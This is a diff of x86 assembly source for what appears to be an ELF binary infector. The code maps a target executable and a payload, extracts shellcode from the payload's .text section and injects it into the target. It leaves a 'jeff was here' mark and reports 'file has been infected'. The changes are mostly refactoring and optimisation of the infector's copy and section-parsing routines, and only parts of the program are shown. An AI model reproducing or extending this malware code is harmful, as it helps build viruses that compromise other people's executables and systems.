@@ -83,7 +83,7 @@ good_arg_count:
 	mov eax, [esp + 0x0c]	; elf name
 
 	;; opening files
-	push eax	; elf name
+	push eax		; elf name
 	push O_RDONLY
 	call open
 
@@ -151,7 +151,7 @@ failed_fstat:
 	jmp close_files		; cleaning resources
 
 mapping:
-	push eax 	; elf_size
+	push eax 		; elf_size
 	push MAP_PRIVATE
 	push dword[elf_fd]
 	call mmap
@@ -181,8 +181,8 @@ mmap_err:
 	push ERR_BAD_MMAP
 	; ebx has a hint of what file failed to map
 	test ebx, ebx
-	je close_files	; elf failed -> nothing was mapped -> close files and exit
-	jmp unmap_elf	; pivot failed -> elf was mapped -> unmap elf, close files then exit
+	je close_files		; elf failed -> nothing was mapped -> close files and exit
+	jmp unmap_elf		; pivot failed -> elf was mapped -> unmap elf, close files then exit
 
 after_mapping:
 	; next we have to check if both the target file and the payload are 32 but, if not then we exit
@@ -234,8 +234,10 @@ extract_shellcode:
 	mov eax, [elf_data]
 	push eax
 	push shellcode_size
-	call find_shell ; returns a pointer to the .text sections, and initializes the shellcode_size variable
-	test eax, eax	; shellcode == NULL ?
+	call find_shell 	; returns a pointer to the .text sections, and initializes
+				; the shellcode_size variable
+
+	test eax, eax		; shellcode == NULL ?
 	jne next
 	push ERR_NO_SHELL
 	jmp clean
@@ -268,7 +270,7 @@ segments:
 
 	; getting p_phunm
 	mov cx, word[eax + e_phnum]
-	movzx ecx, cx		; e_phnum is a word value
+	movzx ecx, cx			; e_phnum is a word value
 
 next_segment:
 
@@ -339,12 +341,12 @@ next2:
 leaving_mark:
 	push marking
 	push marking_len
-	call print	;"leaving a mark ..."
+	call print		;"leaving a mark ..."
 
 	mov eax, [pivot_data]
-	add eax, EI_PAD	; pointing at EI_PAD
+	add eax, EI_PAD		; pointing at EI_PAD
 	push eax
-	push mark	; the "jeff was here" thingy
+	push mark		; the "jeff was here" thingy
 	call strlen
 	push eax
 	call copy_data
@@ -357,9 +359,9 @@ leaving_mark:
 
 	push enjoy
 	push enjoy_len
-	call print	; "file has been infected"
+	call print		; "file has been infected"
 
-	push SUCCESS	; the return value
+	push SUCCESS		; the return value
 
 clean: 	; we have to preserve the state of the stack after each call since the return value was the last thing
 	; pushed on the stack
@@ -468,28 +470,29 @@ copy_data:	; void *copy_data(void *dst, void *src, DWORD size) ; basically a mem
 	push esi
 	push edi
 	push ecx
-	push edx
 	;
 
 	mov edi, [ebp + 0x10]
 	mov esi, [ebp + 0x0c]
 	mov ecx, [ebp + 0x8]	; size
-	xor edx, edx
 
 copying_loop:
 	dec ecx
 	js copied
 
-	movsb
+	cmp ecx, 3
+	jl slow_copy
+
+	movsd
+	sub ecx, 3
 	jmp copying_loop
 
+slow_copy:
+	movsb
+	dec ecx
+	jns slow_copy
+
 copied:
-	;push shell_copied
-	;push shell_copied_len
-	;call print ; "shell copied!"
-	;restoring registers
-	;add esp, 8
-	pop edx
 	pop ecx
 	pop edi
 	pop esi
@@ -640,25 +643,23 @@ ret_patch:
 find_shell: ; void* find_shell(void *data, size_t shellcode_size); returns a pointer to .text section, and stores the shellcode size
 	push ebp
 	mov ebp, esp
-	sub esp, 0xc
-	; some variables here are
-	;[ebp - 4] -> Elf32_Shdr *section = (char *)data + h_ptr -> e_shoff (done)
-	;[ebp - 8] -> Elf32_Shdr *text; uinitialized
-	;[ebp - 0xc] -> (2 bytes value) size_t section_count = h_ptr -> e_shnum (done)
+	sub esp, 0x4
+	; one variable here
+	;[ebp - 2] -> (2 bytes value) size_t section_count = h_ptr -> e_shnum (done)
 	;2 bytes for alignements
 
 	;saving registers
 	push ebx
 	push ecx
 	push edx
+	push esi
+	push edi
 
 	mov ebx, [ebp + 0xc] ; this will stay in ebx for the rest of the function so we don't keep accessing memorry
 
 	;;taking care of the generic section pointer (@ ebp - 4)
-	mov edx, [ebx + e_shoff]
-	add edx, ebx	; for later
-	; edx has the generic section pointer
-	mov [ebp - 4], edx
+	mov edi, [ebx + e_shoff]
+	add edi, ebx	; for later
 	;;
 
 
@@ -668,26 +669,24 @@ find_shell: ; void* find_shell(void *data, size_t shellcode_size); returns a poi
 	mov ecx, Elf32_Shdr_size
 	mul cl			; eax now has the string table file offset in file, and edx has the sections 
 				; base in memorry
-	add eax, edx
+	add eax, edi
 	; now we have a pointer to the string table section, but we want the actuall offset of the section
 	; in memorry
-	mov eax, [eax + sh_offset]
-	add eax, ebx
-	mov edx, eax		; from now on, edx will have the pointer to the string index table, we're gonna
+	mov edx, [eax + sh_offset]
+	add edx, ebx		; from now on, edx will have the pointer to the string index table, we're gonna
 				; use this later
 
 	;;taking care of the section_count variable (@ ebp - 0xc)
 	mov ax, [ebx + e_shnum]
-	mov word[ebp - 0xc], ax
+	mov word[ebp - 2], ax
 
 	; parsing the sections and returning the address of .text
 	xor ecx, ecx
 	push target_section	; argument to strcmp
 
 parsing_loop:
-	mov eax, [ebp - 0x4]	; generic section pointer, by default it points to the first section
 	;get the sh_name and add it to edx (the string table section)
-	mov esi, [eax + sh_name]
+	mov esi, [edi + sh_name]
 	add esi, edx
 	push esi
 	call strcmp
@@ -696,37 +695,38 @@ parsing_loop:
 	test eax, eax
 	je found_text_section
 	;; section ++
-	add dword[ebp - 0x04], Elf32_Shdr_size
+	add edi, Elf32_Shdr_size
 	;;
 
 	inc ecx
-	cmp cx, word[ebp - 0xc] ; e_shnum
+	cmp cx, word[ebp - 2] 	; e_shnum
 	jne parsing_loop
 
 no_text_section:
-	xor eax, eax 	; text = NULL
+	xor eax, eax 		; text = NULL
 	push no_text
 	push no_text_len
 	call print
-	add esp, 0x18
+	add esp, 0x10
 	jmp ret_text_section
 
 found_text_section:;
 	;storing the address of the section header
-	mov eax, [ebp - 0x4]		; the section header pointer
-	mov ecx, eax			; for storing the size later
-	mov eax, [eax + sh_offset] 	; the actual section offset
+	mov eax, edi			; the section header pointer
+	mov eax, [edi + sh_offset] 	; the actual section offset
 	add eax, ebx			; ebx still contains the mmap memory base ; this eax will be returned to 
 					; the previous function!
 	;storing the size
 	mov ebx, [ebp + 0x8]
-	mov ecx, [ecx + sh_size]
+	mov ecx, [edi + sh_size]
 	mov [ebx], ecx
 	;
-	add esp, 0x10
+	add esp, 0x8
 
 ret_text_section:
 	;restoring registers
+	pop edi
+	pop esi
 	pop edx
 	pop ecx
 	pop ebx
@@ -805,7 +805,7 @@ get_file_size:	; size_t get_file_size(int fd);
 
 	push bad_stat
 	push bad_stat_len
-	call print
+	call print		; "couldn't stat file!"
 	mov eax, -1
 	add esp, 8
 
